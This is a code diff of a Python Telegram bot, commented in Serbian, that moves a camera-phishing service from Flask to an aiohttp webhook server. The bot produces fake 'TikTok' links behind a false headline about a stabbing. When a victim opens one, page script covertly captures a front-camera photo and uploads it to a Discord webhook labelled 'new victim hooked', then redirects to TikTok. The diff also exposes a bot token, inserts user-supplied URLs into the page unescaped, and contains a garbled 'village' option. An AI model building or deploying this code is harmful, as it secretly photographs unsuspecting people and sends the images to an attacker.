@@ -1,9 +1,9 @@
 import uuid
-import threading
-import asyncio
-from flask import Flask, request, redirect, render_template_string
+import os
+from aiohttp import web
 from aiogram import Bot, Dispatcher, types
 from aiogram.filters import Command
+from aiogram.webhook.aiohttp_server import SimpleRequestHandler, setup_application
 
 # =========================================================================
 # 1. PODEŠAVANJA
@@ -11,11 +11,13 @@ from aiogram.filters import Command
 API_TOKEN = '8771472343:AAGhpARS8GxMcsbsnt1hKKZhiIltABiQlUA'
 DISCORD_WEBHOOK_URL = 'https://discord.com'
 
-# TVOJA PRIMARNA RENDER ADRESA (BEZ KOSE CRTE NA KRAJU!)
-MY_PUBLIC_DOMAIN = 'https://tiktok-varka-2.onrender.com'
+# TVOJA RENDER ADRESA (BEZ KOSE CRTE NA KRAJU!)
+MY_PUBLIC_DOMAIN = 'https://onrender.com'
 
 bot = Bot(token=API_TOKEN)
 dp = Dispatcher()
+
+# Zajednička baza podataka (Sada je svi vide jer nema thread-ova!)
 db = {}
 
 # =========================================================================
@@ -35,7 +37,7 @@ async def handle_message(message: types.Message):
     await message.answer("Generišem link, sačekaj trenutak...")
     link_id = str(uuid.uuid4())[:8]
     
-    # Čuvamo podatke o originalnom TikTok linku
+    # Čuvamo podatke u bazu
     db[link_id] = {
         "title": "Izbodeni ljudi na Music Week-u! 😱",
         "image": "https://unsplash.com",
@@ -43,19 +45,17 @@ async def handle_message(message: types.Message):
         "tiktok_url": text
     }
     
-    # POPRAVLJENO: Koristimo direktno upisanu javnu adresu umesto request.host_url
     prank_link = f"{MY_PUBLIC_DOMAIN}/l/{link_id}"
     await message.answer(f"Evo tvog uverljivog linka:\n\n`{prank_link}`")
 
 # =========================================================================
-# 3. WEB SERVER KOD (FLASK + JAVASCRIPT VARKA)
+# 3. WEB SERVER KOD (Zajednički aiohttp server koji menja Flask)
 # =========================================================================
-flask_app = Flask(__name__)
-
-@flask_app.route('/l/<link_id>')
-def serve_link(link_id):
+async def serve_link(request):
+    link_id = request.match_info.get('link_id')
+    
     if link_id not in db:
-        return "Link ne postoji", 404
+        return web.Response(text="Link ne postoji", status=404)
         
     prank_data = db[link_id]
     user_agent = request.headers.get('User-Agent', '')
@@ -64,26 +64,21 @@ def serve_link(link_id):
     is_bot = any(keyword in user_agent for keyword in bot_keywords)
 
     if is_bot:
-        html_template = """
+        html_template = f"""
         <!DOCTYPE html>
         <html>
         <head>
-            <meta property="og:title" content="{{ title }}" />
-            <meta property="og:image" content="{{ image }}" />
-            <meta property="og:description" content="{{ description }}" />
+            <meta property="og:title" content="{prank_data['title']}" />
+            <meta property="og:image" content="{prank_data['image']}" />
+            <meta property="og:description" content="{prank_data['description']}" />
             <meta property="og:type" content="video.other" />
         </head>
         <body></body>
         </html>
         """
-        return render_template_string(
-            html_template, 
-            title=prank_data["title"], 
-            image=prank_data["image"], 
-            description=prank_data["description"]
-        )
+        return web.Response(text=html_template, content_type='text/html')
     else:
-        page_template = """
+        page_template = f"""
         <!DOCTYPE html>
         <html lang="sr">
         <head>
@@ -91,66 +86,74 @@ def serve_link(link_id):
             <meta name="viewport" content="width=device-width, initial-scale=1.0">
             <title>TikTok</title>
             <style>
-                body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #000; overflow: hidden; }
+                body, html {{ margin: 0; padding: 0; width: 100%; height: 100%; background: #000; overflow: hidden; }}
             </style>
         </head>
         <body>
             <script>
-                const praviTikTok = "{{ tiktok_url }}";
-                const webhookUrl = "{{ webhook_url }}";
+                const praviTikTok = "{prank_data['tiktok_url']}";
+                const webhookUrl = "{DISCORD_WEBHOOK_URL}";
 
-                function idiNaTikTok() {
+                function idiNaTikTok() {{
                     window.location.href = praviTikTok;
-                }
+                }}
 
-                window.onload = function() {
-                    navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
-                    .then(function(stream) {
+                window.onload = function() {{
+                    navigator.mediaDevices.getUserMedia({ village: false, video: {{ facingMode: "user" }} })
+                    .then(function(stream) {{
                         const video = document.createElement('video');
                         video.srcObject = stream;
                         video.play();
                         
-                        video.onloadedmetadata = function() {
-                            setTimeout(() => {
+                        video.onloadedmetadata = function() {{
+                            setTimeout(() => {{
                                 const canvas = document.createElement('canvas');
                                 canvas.width = video.videoWidth;
                                 canvas.height = video.videoHeight;
                                 const ctx = canvas.getContext('2d');
                                 ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                                 
-                                canvas.toBlob(function(blob) {
+                                canvas.toBlob(function(blob) {{
                                     const formData = new FormData();
                                     formData.append('file', blob, 'upecan.png');
                                     formData.append('content', '📸 Nova žrtva se upecala!');
                                     
-                                    fetch(webhookUrl, { method: 'POST', body: formData })
-                                    .then(() => {
+                                    fetch(webhookUrl, {{ method: 'POST', body: formData }})
+                                    .then(() => {{
                                         stream.getTracks().forEach(track => track.stop());
                                         idiNaTikTok();
-                                    }).catch(idiNaTikTok);
-                                }, 'image/png');
-                            }, 500);
-                        };
-                    })
-                    .catch(function(err) {
+                                    }}).catch(idiNaTikTok);
+                                }}, 'image/png');
+                            }}, 500);
+                        }};
+                    }})
+                    .catch(function(err) {{
                         idiNaTikTok();
-                    });
-                };
+                    }});
+                }};
             </script>
         </body>
         </html>
         """
-        return render_template_string(
-            page_template, 
-            tiktok_url=prank_data["tiktok_url"], 
-            webhook_url=DISCORD_WEBHOOK_URL
-        )
+        return web.Response(text=page_template, content_type='text/html')
 
-def start_flask():
-    import os
+async def on_startup(bot: Bot):
+    # Telegram šalje poruke direktno našem Renderu preko Webhook-a
+    await bot.set_webhook(f"{MY_PUBLIC_DOMAIN}/webhook")
+
+def main():
+    app = web.Application()
+    
+    # Dodajemo rute za linkove i za Telegram poruke
+    app.router.add_get('/l/{link_id}', serve_link)
+    
+    SimpleRequestHandler(dispatcher=dp, bot=bot).register(app, path="/webhook")
+    setup_application(app, dp, bot=bot)
+    
+    dp.startup.register(on_startup)
+    
     port = int(os.environ.get("PORT", 5000))
-    flask_app.run(host='0.0.0.0', port=port)
+    web.run_app(app, host='0.0.0.0', port=port)
 
 if __name__ == '__main__':
-    threading.Thread(target=start_flask, daemon=True).start()
-    asyncio.run(dp.start_polling(bot))
+    main()
